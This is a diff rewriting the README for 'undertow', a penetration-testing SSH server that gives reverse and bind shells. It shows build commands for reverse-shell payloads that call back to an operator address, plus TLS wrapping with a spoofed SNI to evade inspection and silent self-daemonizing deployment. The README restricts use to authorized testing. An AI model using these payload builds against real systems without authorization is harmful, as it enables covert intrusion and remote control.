@@ -1,120 +1,58 @@
+# undertow
+
+Static SSH server for bind and reverse shells with PTY and SFTP
+
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-light.svg">
-  <img alt="Undertow" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg" width="100%">
+  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/cover-dark.svg">
+  <img alt="undertow: a tuned static binary on the target becomes a PTY shell for the operator's plain ssh client" src="docs/assets/cover-light.svg" width="100%">
 </picture>
 
-> [!IMPORTANT]
-> **Statically-linked SSH server for penetration testing — under 1.5MB.** Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire. Go predecessor to [Neap](https://github.com/Real-Fruit-Snacks/Neap).
+```sh
+./build.sh reverse 10.10.14.5:4444
+./build.sh listen 8888
+```
+
+I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. undertow is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain `ssh` client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. For authorized security testing only.
+
+undertow is the preservation fork of [Ferdinor's undertow](https://github.com/Ferdinor) (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained: current dependencies (the 2021 `x/crypto` pin had known SSH vulnerabilities), CI on every commit, and tagged releases with six prebuilt binaries.
 
 > *An undertow is a current flowing beneath the surface in the opposite direction from what's visible above. Felt fitting for a tool that hides SSH traffic inside TLS — appearing as HTTPS on the wire while the session flows underneath.*
 
----
+## What's in it
 
-## §1 / Premise
+| Piece | Does |
+|---|---|
+| `reverse` | Binary dials home through egress firewalls; you SSH to the bind it sets up on your box (random port by default, `-b` pins it) |
+| `listen` | Binary listens on the target; you SSH straight to it |
+| PTY | openpty on Linux, ConPTY on Windows 10 17763+ — tab completion, job control, full-screen tools |
+| SFTP | Built-in subsystem on the same connection — `sftp -P 4444 svc@127.0.0.1` |
+| Forwarding | Local (`-L`), remote (`-R`) and dynamic SOCKS (`-D`) through the stock ssh client; the session is the pivot |
+| `--tls` | Wraps SSH in TLS with ALPN and a spoofed SNI (default `www.microsoft.com`) so the banner never crosses the wire in plaintext |
+| `--nocli` | Bakes a flagless payload; with `--daemonize` it also backgrounds itself on launch (frees evil-winrm-style sessions) |
 
-Undertow is a **statically-linked SSH server** for penetration testing. It provides reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single Go binary under 1.5MB. `CGO_ENABLED=0` cross-compilation means the binary runs anywhere with no runtime dependencies — drop it, run it, SSH in.
+`./build.sh` cross-compiles Linux and Windows binaries with a fresh random password baked in (`-p` pins one, `-k` bakes an ED25519 authorized key instead), and writes a handler script for reverse mode that starts the listener, shows the password and prints the exact `ssh` command when the callback lands. Every status line starts with a bracketed tag — `[ok]`, `[!]`, `[x]`, `[i]` — so output stays meaningful piped or with `NO_COLOR` set.
 
-Reverse mode dials home through firewalls. Bind mode listens on the target. Both support full PTY (openpty on Linux, ConPTY on Windows), SFTP, and port forwarding identically. The build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives.
+## Tested on
 
-TLS wrapping is optional and transparent — wraps SSH inside TLS with ALPN negotiation and SNI spoofing so the SSH banner never appears in plaintext on the wire. Auto-daemonize detaches from the shell on deployment (`-d` flag or baked in at build time with `--daemonize`), freeing the session from evil-winrm, WMI, or similar execution contexts.
+- Windows 11 · Go 1.27 — build host; gofmt, `go vet`, clean builds for all six targets
+- ubuntu-24.04, windows-2022, macos-latest · CI builds amd64 and arm64 on every commit
+- *Not* run: macOS at runtime — cross-compiled on every release, unsigned; first run needs `xattr -d com.apple.quarantine`
 
-**Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.
+## Known issues
 
----
+- The dial-home side uses `InsecureIgnoreHostKey`: a payload can't pin a host key it has never seen. Verify the callback out of band — the handler shows the connecting address and the rs-info line names the user and host.
+- TLS wrapping presents a self-signed certificate generated at runtime. It hides the SSH banner from DPI; it does not authenticate the listener to the payload.
+- Baked credentials live in the binary. Build per engagement, and keep the handler scripts to yourself — they print the password and are written `chmod 700` for a reason.
+- Windows targets older than Windows 10 17763 have no ConPTY; use `-s ssh-shellhost.exe`, or append `cmd` to the ssh line for a non-PTY session.
+- Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; `SHA256SUMS.txt` comes from the same release as the binaries it checks.
 
-## §2 / Specs
+## Configuration
 
-| KEY        | VALUE                                                                       |
-|------------|-----------------------------------------------------------------------------|
-| SIZE       | **<1.5MB static** · CGO_ENABLED=0 · no runtime dependencies                |
-| SHELLS     | **Reverse + bind** · PTY support (Linux openpty / Windows ConPTY)           |
-| TRANSPORT  | **TLS wrapping** · ALPN negotiation · SNI spoofing · SSH over HTTPS         |
-| SFTP       | **Built-in subsystem** · upload/download through the SSH connection         |
-| FORWARDING | **Local · remote · dynamic** · SOCKS proxy · SSH tunnel capabilities        |
-| DAEMONIZE  | **Auto-detach** · runtime flag (-d) · build-time bake-in (--daemonize)     |
-| STACK      | **Go 1.15+** · CGO_ENABLED=0 · static · GPLv3                              |
+- `./build.sh <mode> <target> [options]` — see `./build.sh --help`; every build knob ends up as an ldflags variable (`RS_PASS`, `LHOST`, `TLS_SNI`, …), so the [Makefile](Makefile) works directly too
+- `NO_COLOR` — plain output from the build script and the binary
 
-Architecture in §4 below.
+## License
 
----
+[GPLv3](LICENSE), inherited from the upstream project; original copyright headers stay in every source file. For authorized security testing with explicit written permission only.
 
-## §3 / Quickstart
-
-**Prerequisites:** Go 1.15+, Make
-
-```bash
-git clone https://github.com/Real-Fruit-Snacks/Undertow.git
-cd Undertow
-```
-
-**Reverse shell:**
-
-```bash
-./build.sh reverse 192.168.1.10:4444
-./bin/handler-192-168-1-10-4444    # start handler — shows SSH command on callback
-```
-
-**Bind shell:**
-
-```bash
-./build.sh listen 8888
-ssh -p 8888 svc@TARGET_IP          # connect from attacker
-```
-
-**With TLS:**
-
-```bash
-./build.sh reverse 10.10.14.5:443 --tls --sni login.microsoft.com
-./build.sh listen 8888 --tls --sni google.com
-```
-
-**Silent deployment (no CLI, auto-backgrounds):**
-
-```bash
-./build.sh reverse 10.10.14.5:443 --nocli --daemonize
-```
-
----
-
-## §4 / Architecture
-
-```
-Undertow/
-├── main.go                 Entry point, mode selection
-├── core.go                 SSH server configuration, key generation
-├── ssh_session.go          Session handling, PTY, SFTP
-├── ssh_session_unix.go     Linux PTY via creack/pty
-├── ssh_session_windows.go  Windows ConPTY
-├── detach_windows.go       Background mode (DETACHED_PROCESS)
-├── detach_unix.go          Background mode (setsid)
-├── build.sh                Build script with handler generation
-└── Makefile
-```
-
-| Layer        | Implementation                                                  |
-|--------------|-----------------------------------------------------------------|
-| **Modes**    | Bind (server listens) · reverse (client dials home)             |
-| **Session**  | SSH-2.0 · PTY shells · SFTP subsystem · port forwarding         |
-| **Transport**| Optional TLS · ALPN negotiation · SNI spoofing                  |
-| **Daemonize**| Unix setsid · Windows DETACHED_PROCESS + CREATE_NO_WINDOW       |
-| **Build**    | CGO_ENABLED=0 · static · optional UPX compression              |
-
-Single static binary. Under 1.5MB for Linux. Optional UPX compression via `--compress`. The build script generates a handler script alongside the binary with embedded credentials and connection details.
-
----
-
-## §5 / Platform Support
-
-| Capability | Linux | Windows |
-|------------|-------|---------|
-| Reverse shell | Full (PTY) | Full (ConPTY) |
-| Bind shell | Full | Full |
-| SFTP | Full | Full |
-| Port forwarding | Full | Full |
-| TLS wrapping | Full | Full |
-| Auto-daemonize | Full (setsid) | Full (DETACHED_PROCESS) |
-
----
-
-[License: GPLv3](LICENSE) · Part of [Real-Fruit-Snacks](https://github.com/Real-Fruit-Snacks) — building offensive security tools, one wave at a time.
+[Project page](https://real-fruit-snacks.github.io/Undertow/) · [Changelog](CHANGELOG.md) · [Security](SECURITY.md)
